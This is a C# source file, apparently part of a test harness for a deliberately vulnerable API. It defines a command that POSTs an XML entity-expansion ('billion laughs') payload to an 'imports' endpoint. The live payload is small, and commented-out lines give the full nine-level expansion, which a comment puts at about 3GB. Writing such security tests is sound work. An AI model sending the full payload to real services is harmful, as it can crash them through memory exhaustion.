using System;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

public class XmlBombCommand : BaseBadCommand
{
    public override async Task<bool> ExecuteAsync(BadApiSession session, CancellationToken token = default)
    {
        // api/imports
        // before the deserialization starts... it'll push it into an xmldoc
        // XmlReader... construct an xml doc which can blow up with internal refs
        const string xmlToSend = "<?xml version=\"1.0\"?>"
            + "<!DOCTYPE lolz ["
            + "<!ENTITY lol \"lol\">"
            + "<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">"
            + "]>"
            + "<lolz>&lol2;</lolz>";

        // with this 3gb of data, but just to test
        // <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        // <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        // <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        // <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
        // <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
        // <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
        // <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">

        var content = new StringContent(xmlToSend, Encoding.UTF8, "application/xml");
        var results = await session.WithAuthenticatedEndpoint("imports").SendAsync(HttpMethod.Post, content, token);

        // should be 200 OK with the contents of the /Entities/Entity
        Console.WriteLine("XmlBomb completed with status: {0}, and content: {1}", results.StatusCode, await results.GetStringAsync());
        return results.StatusCode == 200;
    }
}